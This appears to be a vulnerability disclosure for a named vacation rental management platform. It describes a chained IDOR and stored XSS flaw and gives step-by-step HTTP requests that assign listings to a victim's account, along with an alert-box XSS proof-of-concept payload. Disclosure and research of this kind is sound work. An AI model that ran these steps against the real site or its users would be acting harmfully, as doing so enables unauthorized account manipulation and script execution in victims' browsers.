<table>
  <tr>
    <td width="150">
      <img src="logo.png" alt="Summer Pearl Logo" width="120"/>
    </td>
    <td>
      <h1>Summer Pearl Group</h1>
      <h3>Vacation Rental Management Platform Vulnerability</h3>
    </td>
  </tr>
</table>


## Chained IDOR and Stored XSS Vulnerability

## 📜 Description
**Summer Pearl Group Vacation Rental Management Platform** versions prior to **1.0.1** suffer from an **Insecure Direct Object reference (IDOR)** vulnerability in the listing management functionality. Authenticated attackers can manipulate request parameters to create/modify listings under arbitrary user accounts. Combined with insufficient input sanitization, this allows **Stored Cross-Site Scripting (XSS)** attacks via crafted listing names. Successful exploitation leads to unauthorized data manipulation and client-side code execution when victims view affected listings in the calendar interface.

## 📌 Affected Version
- Vacation Rental Management Platform v1.0.0

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## :triangular_flag_on_post: Steps to Reproduce

### 1️⃣ **Authenticate** as attacker
```
POST /spgpm/login HTTP/1.1
Host: summerpearlgroup.gr

username=attacker&password=password&_csrf=...
```

### 2️⃣ **Intercept listing request**
- Capture with Burp Suite or DevTools:
```
POST /spgpm/updateListing HTTP/1.1
Host: summerpearlgroup.gr

_csrf=TOKEN&id=&spgLsOwner=VICTIM_ID&spgLsTitle=<img+src=x+onerror=alert(1)>...
```

### 3️⃣ **Exploit IDOR**
- Set `spgLsOwner` to victim's ID (e.g., `50`)
- Keep `id` empty (creates new) or specify existing listing ID

### 4️⃣ **Inject XSS**
- Malicious `spgLsTitle` payload:
```
<img src=x onerror=alert(1)>
```

### 5️⃣ **Trigger exploit**
- Victim views calendar → XSS executes automatically

## Notes
- Test with non-destructive payloads first
- Replace `VICTIM_ID` with actual target user ID

## 🎬 Demonstration Video

<a href="https://www.youtube.com/watch?v=0wwuatTa6sU" target="_blank">
  <img src="https://img.youtube.com/vi/0wwuatTa6sU/maxresdefault.jpg"/>
</a>

## 🧑‍💻 Discovery
The vulnerability was discovered by **Alex Perrakis (Stolichnayer)**.

## 🔗 **References:**
- [Summer Pearl Group](https://summerpearlgroup.gr/spgpm/portal)
- [Vacation Rental Management Platform](https://summerpearlgroup.gr/spgpm/login)

